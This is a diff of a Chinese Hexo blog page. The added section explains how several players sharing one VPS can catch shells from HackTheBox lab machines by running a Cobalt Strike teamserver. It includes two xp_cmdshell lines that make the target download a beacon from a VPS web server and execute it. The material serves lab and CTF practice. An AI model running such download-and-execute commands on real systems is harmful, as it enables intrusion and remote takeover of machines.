@@ -306,7 +306,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-10-25 00:22:57" itemprop="dateModified" datetime="2024-10-25T00:22:57+08:00">2024-10-25</time>
+      <time title="修改时间：2024-10-25 12:12:56" itemprop="dateModified" datetime="2024-10-25T12:12:56+08:00">2024-10-25</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -329,14 +329,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1.2k</span>
+      <span>1.6k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
+      <span>6 分钟</span>
     </span>
 </div>
 
@@ -395,6 +395,26 @@
 <p>整体使用效果平均为172ms：</p>
 <p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/kali-to-htb.jpg" alt="kali-to-htb"></p>
 <p>这样有个好处，如果还嫌本地和靶场交互操作慢，可以选择接梯子加速连上VPS，从VPS和靶场直接交互，延迟只有不到3ms。</p>
+<h2 id="多人情况下如何反弹shell"><a href="#多人情况下如何反弹shell" class="headerlink" title="多人情况下如何反弹shell?"></a>多人情况下如何反弹shell?</h2><p>由于多人一起打，本质上是通过一个公用vps将所有人的流量集体转发到HTB靶场内部，如下图:</p>
+<pre><code class="highlight mermaid">flowchart LR
+    A[player 1] --&gt; B(vps)
+    C[player 2] --&gt; B(vps)
+    D[player 3] --&gt; B(vps)
+    B(vps) --&gt;|请求| E[HTB]
+    E[HTB] --&gt;|响应| B(vps)
+</code></pre>
+
+<p>所以想要反弹shell，只能反弹到vps上，并不能直接反弹到每个玩家的攻击机上。</p>
+<p><strong>那么有没有什么解决办法呢？</strong></p>
+<p>有，我们可以直接用一种更高级的“反弹shell”手段，即使用C2工具。</p>
+<p>既然能反弹shell，说明一定能执行命令，那么就可以通过执行命令，下载C2工具的beacon然后直接将受害机上线。</p>
+<p>以 CobaltStrike 为例，在 vps 上启动 CobaltStrike 的 teamserver</p>
+<p><img src="https://raw.githubusercontent.com/Lamber-maybe/blog-img/master/blog-img/202410251157628.png" alt="202410251157628"></p>
+<p>反弹shell 以 mssql 的 xp_cmdshell 为例，首先生成一个 CS 的 beacon，然后用python启动一个临时的web服务，使用 xp_cmdshell 下载 beacon 并执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="string">&#x27;powershell.exe wget http://vps-ip:8000/cs.exe -OutFile C:\\Users\Public\\cs.exe&#x27;</span></span><br><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="string">&#x27;C:\\Users\Public\\cs.exe&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样每个玩家就可以在自己的攻击机上面，连接 teamserver 去控制受害机了。</p>
+<p>注：如果想要让每个玩家之间互不剧透或者走捷径，即A玩家上线了一台受害主机之后，不想让B玩家直接操控这台主机（想让B玩家自己从头完整打一遍），可以找一个有权限分级的C2工具来用。</p>
 
       
     </div>
@@ -958,13 +978,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">15k</span>
+    <span title="站点总字数">16k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">56 分钟</span>
+    <span title="站点阅读时长">57 分钟</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
